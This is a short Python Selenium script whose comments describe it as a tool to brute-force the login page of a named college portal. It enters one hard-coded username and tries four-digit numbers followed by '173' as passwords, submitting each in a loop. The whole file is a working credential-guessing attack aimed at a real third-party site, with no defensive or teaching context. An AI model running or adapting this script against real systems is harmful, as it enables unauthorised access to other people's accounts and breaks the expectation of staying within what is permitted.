#selenium python code to bruteforce the login page that have predictable username and password.
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
chrome_path = r"C:\Users\Varun\Downloads\chromedriver_win32\chromedriver.exe"
driver = webdriver.Chrome(chrome_path)
def login(i):
    i=str(i)
    #website to bruteforce
    driver.get("https://portal.vjcet.ac.in/")
    #time.sleep(5)
    #finding the element for username and inputs the userid/username
    user = driver.find_element_by_css_selector('#txtUserName_txt')
    user.send_keys('pv13rr173')
    #finding the password element and bruteforcing the password with possible values.
    password = driver.find_element_by_css_selector('#txtPassword_txt')
    password.send_keys(i+'173')
    login = driver.find_element_by_css_selector('#btnLogin')
    s=login.click()
    WebDriverWait(driver,100).until(lambda  driver: driver.find_element_by_xpath('//*[@id="menu"]/div[2]/div/ul[2]/li/a'))


        #driver.save_screenshot("screenshot.png")
    return
#loop to generate possible set of values to bruteforce the password.
while True:
    for i in range(1000,9999):
        login(i)
        print(i)
        #if s:
         #   time.sleep(19999999)
#time.sleep(100)



